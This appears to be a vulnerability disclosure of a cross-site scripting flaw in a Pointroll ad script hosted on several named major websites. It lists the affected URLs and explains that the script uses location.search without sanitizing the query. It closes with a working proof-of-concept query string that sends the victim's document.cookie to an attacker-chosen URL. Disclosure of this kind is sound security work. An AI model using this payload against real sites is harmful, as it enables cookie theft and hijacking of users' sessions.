 A cross-site scripting vulnerability has been discovered on multiple
websites which use ads provided by Pointroll.

The following list is a subset of the websites which contain the
vulnerability:
http://www.cnn.com/pointroll/PointRollAds.htm
http://www.myspace.com/pointroll/PointRollAds.htm
http://www.friendster.com/pointroll/PointRollAds.htm
http://archive.gamespy.com/pointroll/PointRollAds.htm
http://www.monster.com/pointroll/PointRollAds.htm
http://www.allmusic.com/pointroll/PointRollAds.htm
http://www.pcworld.com/pointroll/PointRollAds.htm
http://www.10best.com/pointroll/PointRollAds.htm
http://www.askmen.com/pointroll/PointRollAds.htm
http://pages.ebay.com/pointroll/PointRollAds.html

The above pages include a script at pointroll.com which is the root of the
vulnerability. The vulnerability arises from the use of
location.searchwithout sanitizing the query.

The following is a proof of concept which works in Firefox. This should be
placed onto the end of any of the above URLs, obviously. [URL] should be
replaced by your website URL, such as http://www.foo.com/bar.php, and
[LENGTH+1] should be the length of your website URL + 1.

?pub=[URL]?&redir=%27%3E%3Cscript%3Ewindow.location=
location.search.substring(5,[LENGTH+1]).concat(document.cookie
)%3C/script%3E&ad=g235e20051011164320
